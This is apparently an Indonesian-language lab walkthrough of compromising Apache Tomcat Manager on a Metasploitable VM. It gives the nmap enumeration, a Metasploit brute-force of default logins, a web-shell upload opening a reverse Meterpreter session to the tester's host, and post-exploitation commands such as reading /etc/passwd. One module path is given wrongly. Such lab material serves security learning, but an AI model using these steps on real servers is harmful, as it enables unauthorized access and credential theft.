# Introduction

**Apache Tomcat** adalah sebuah server web sumber terbuka (_open source_) dan wadah servlet yang dikembangkan oleh Apache Software Foundation. Fungsinya adalah untuk menjalankan aplikasi web berbasis Java seperti servlet dan JavaServer Pages (JSP). Sederhananya, Tomcat menyediakan lingkungan tempat kode Java dapat dieksekusi dan disajikan sebagai halaman web, sehingga sangat penting dalam ekosistem pengembangan web Java.

Apa Itu **Tomcat Manager**?

Tomcat Manager adalah aplikasi web yang kuat yang digunakan oleh administrator untuk:

-	Mengelola, menginstal, dan menghapus aplikasi web lain yang berjalan di server.

-	Memantau status server.

- Melihat sesi pengguna.

Karena fungsinya yang sangat kuat, Tomcat Manager adalah target utama bagi penyerang.

**Analisis Kerentanan**

Ketika pengguna mencoba mengakses direktori Tomcat Manager (misalnya, http://target.com/manager/html) dan mendapatkan respons **401 Unauthorized**, itu berarti server mengenali bahwa Anda mencoba mengakses area yang dilindungi kata sandi, tetapi Anda belum memasukkan kredensial yang valid.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

- Memindai port default tomcat, yaitu 8080 dan 8180 pada IP target
```
nmap -p 8080,8180 --script=http-title,http-enum <ip_metasploitable>
```
Script _http-title_ adalah salah satu script yang tersedia di Nmap Scripting Engine (NSE). Fungsi utamanya adalah untuk mengambil judul (title) dari halaman web yang berjalan di server target. Sedangkan, _script http-enum_ digunakan untuk membantu menemukan direktori yang tersembunyi.
```
PORT     STATE  SERVICE
8080/tcp closed http-proxy
8180/tcp open   unknown
|_http-title: Apache Tomcat/5.5	   
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /admin/admin_login.jsp: Possible admin folder
|   /admin/adminLogin.jsp: Possible admin folder
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|...
```
Nmap menemukan halaman **manager/html** yang memerlukan otentikasi (**401 Unauthorized**). Ini adalah petunjuk yang sangat penting karena antarmuka manager sering kali memiliki kredensial default yang lemah atau mudah ditebak. Jika kita bisa masuk, kita bisa mengunggah web shell untuk mendapatkan akses.

- Eksplorasi Web Server menggunakan browser
```
<ip_metasploitable>:8180
```
**3. _Gaining Access (Exploitation)_**
- Menjalankan Metasploit Framework
```
msfconsole
```
- Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan
```
search tomcat manager
```

```
Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos       2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/tomcat_mgr_deploy                   2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   2     \_ target: Automatic                                 .                .          .      .
   3     \_ target: Java Universal                            .                .          .      .
   4     \_ target: Windows Universal                         .                .          .      .
   5     \_ target: Linux x86                                 .                .          .      .
   6   exploit/multi/http/tomcat_mgr_upload                   2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   7     \_ target: Java Universal                            .                .          .      .
   8     \_ target: Windows Universal                         .                .          .      .
   9     \_ target: Linux x86                                 .                .          .      .
   10  exploit/multi/http/cisco_dcnm_upload_2019              2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   11    \_ target: Automatic                                 .                .          .      .
   12    \_ target: Cisco DCNM 11.1(1)                        .                .          .      .
   13    \_ target: Cisco DCNM 11.0(1)                        .                .          .      .
   14    \_ target: Cisco DCNM 10.4(2)                        .                .          .      .
   15  auxiliary/admin/http/ibm_drm_download                  2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   16  auxiliary/scanner/http/tomcat_mgr_login                .                normal     No     Tomcat Application Manager Login Utility
   17  exploit/multi/http/tomcat_partial_put_deserialization  2025-03-10       excellent  Yes    Tomcat Partial PUT Java Deserialization
   18    \_ target: Unix Command                              .                .          .      .
   19    \_ target: Windows Command                           .                .          .      .
```
```
|Modul	              |Tipe	     |Fungsi
|tomcat_mgr_login	  |scanner	 |Mencari kredensial valid dengan serangan brute-force.	
|tomcat_mgr_upload	  |exploit	 |Mengunggah dan menyebarkan (deploy) web shell dengan kredensial yang sudah diketahui.
|tomcat_mgr_deploy	  |exploit	 |Sebagian besar berfungsi sama seperti _upload, yaitu untuk menyebarkan payload.
```
- Memilih dan mengatur eksploitasi
```
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <ip_metasploitable>
set RPORT 8180
set LHOST <ip_kali_linux>
```
Mencari cridential valid (username dan password) menggunakan _bruteforce_ dari modul __login_

- Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
```
show options
```
- Jika sudah lengkap, jalankan serangan
```
exploit
```

```
[-] ...
[-] 192.168.175.90:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-] 192.168.175.90:8180 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 192.168.175.90:8180 - Login Successful: tomcat:tomcat
[-] 192.168.175.90:8180 - LOGIN FAILED: both:admin (Incorrect)
[-] 192.168.175.90:8180 - LOGIN FAILED: both:manager (Incorrect)
[-] ...
```
- Menggunakan credential untuk eksploitasi lanjutan menggunakan _upload
```
use auxiliary/scanner/http/tomcat_mgr_upload
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
exploit
```

```
[*] Started reverse TCP handler on 192.168.175.235:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying qlDaWVxPYvWkOSS65i...
[*] Executing qlDaWVxPYvWkOSS65i...
[*] Undeploying qlDaWVxPYvWkOSS65i ...
[*] Undeployed at /manager/html/undeploy
[*] Sending stage (58073 bytes) to 192.168.175.90
[*] Meterpreter session 1 opened (192.168.175.235:4444 -> 192.168.175.90:55683) at 2025-08-18 22:03:40 -0400

meterpreter >
```
**4. _Maintaining accsess dan Post exploitation_**
- Verifikasi user atau akses root
```
whoami
```
- Eksplorasi sistem
```
ls -l                    //melihat list file dan direktory
```
```
uname -a                 //melihat versi kernel dan informasi sistem
```
```
cat /etc/passwd          //melihat daftar user
```
```
cd /root                 //mencari file sensitif
```
